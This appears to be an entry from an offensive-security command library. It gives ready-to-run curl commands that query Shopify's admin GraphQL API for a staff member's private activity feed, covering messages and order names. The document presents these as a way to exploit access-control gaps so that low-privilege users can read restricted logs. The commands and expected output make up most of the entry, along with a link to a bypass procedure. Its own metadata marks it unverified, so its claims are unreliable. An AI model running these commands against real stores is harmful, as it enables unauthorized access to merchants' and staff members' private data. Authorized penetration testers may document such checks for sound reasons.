---
id: cmd-uuid-001
data: >-
  curl -X POST 'https://{store-name}.myshopify.com/admin/api/graphql.json' -H
  'Content-Type: application/json' -H 'X-Shopify-Access-Token:
  {staff-access-token}' -d '{"query": "query ActivityFeed($first: Int!) {
  staffMember { privateData { activityFeed(first: $first) { edges { node { ...
  on Activity { author { ... on StaffMember { name } } createdAt messages(first:
  10) { edges { node { text } } } topic { ... on ActivityTopic { title } }
  attributed { ... on AttributedActivity { ... on OrderActivity { order { name }
  } } } } } } } } } } }", "variables": {"first": 20}}'
tags:
  - graphql
  - bypass
  - shopify
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.452Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-activityfeed-query

## Command

```bash
curl -X POST 'https://{store-name}.myshopify.com/admin/api/graphql.json' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: {staff-access-token}' \
  -d '{"query": "query ActivityFeed($first: Int!) { staffMember { privateData { activityFeed(first: $first) { edges { node { ... on Activity { author { ... on StaffMember { name } } createdAt messages(first: 10) { edges { node { text } } } topic { ... on ActivityTopic { title } } attributed { ... on AttributedActivity { ... on OrderActivity { order { name } } } } } } } } } } } } }", "variables": {"first": 20}}'
```

## Description

This curl command sends a GraphQL POST request to Shopify's admin API to query the restricted ActivityFeed under staffMember.privateData, exploiting access control gaps to retrieve activity logs for low-privilege users. Use it to test for unauthorized data disclosure in authenticated sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{store-name}` | The Shopify store subdomain (e.g., mystore) | Yes |
| `{staff-access-token}` | Valid staff access token from authenticated session | Yes |
| `$first` | Pagination limit for activity edges (default 20) | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.myshopify.com/admin/api/graphql.json' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: shpat_abc123' \
  -d '{"query": "query ActivityFeed($first: Int!) { staffMember { privateData { activityFeed(first: $first) { edges { node { ... on Activity { author { ... on StaffMember { name } } createdAt } } } } } } } } }", "variables": {"first": 10}}'
```

### Advanced Usage

```bash
curl -X POST 'https://example.myshopify.com/admin/api/graphql.json' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: shpat_abc123' \
  -H 'Cookie: _shopify_sa=...' \
  -d '{"query": "query ActivityFeed($first: Int!) { staffMember { privateData { activityFeed(first: $first) { edges { node { ... on Activity { author { ... on StaffMember { name } } createdAt messages(first: 10) { edges { node { text } } } topic { ... on ActivityTopic { title } } attributed { ... on AttributedActivity { ... on OrderActivity { order { name } } } } } } } } } } } } }", "variables": {"first": 20}}' | jq '.'
```

## Expected Output

Successful execution returns a JSON object with data.staffMember.privateData.activityFeed containing edges of Activity nodes, including fields like author.name, createdAt, messages.text, topic.title, and attributed.order.name. Example snippet:

```json
{
  "data": {
    "staffMember": {
      "privateData": {
        "activityFeed": {
          "edges": [
            {
              "node": {
                "author": {
                  "name": "Staff User"
                },
                "createdAt": "2023-09-01T12:00:00Z",
                "messages": {
                  "edges": [{"node": {"text": "Order updated"}}]
                }
              }
            }
          ]
        }
      }
    }
  }
}
```
If permissions are enforced, expect an error like "Field 'activityFeed' doesn't exist on type 'PrivateData'" or access denied.

## Related

- [[procedures/Bypass-Shopify-GraphQL-Access-Control]]
- [[curl]]
